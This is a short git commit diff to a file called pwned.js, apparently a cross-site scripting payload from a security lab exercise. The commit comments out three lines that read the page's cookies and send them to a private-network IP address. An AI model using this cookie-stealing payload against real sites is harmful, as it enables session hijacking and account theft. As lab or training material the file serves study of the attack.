5309bf58553e71b7ea3d513b732ef9efbe9b4def
aitortxu20 <aitortxuboy@gmail.com>
2023-12-01 21:29:06 +0100

    b

--- pwned.js
+++ pwned.js
@@ -1,5 +1,5 @@
 alert("Alerta con img");
 
-var request = new XMLHttpRequest();
-request.open('GET', 'http://192.168.75.128/?cookie=' + document.cookie);
-request.send();
+//var request = new XMLHttpRequest();
+//request.open('GET', 'http://192.168.75.128/?cookie=' + document.cookie);
+//request.send();
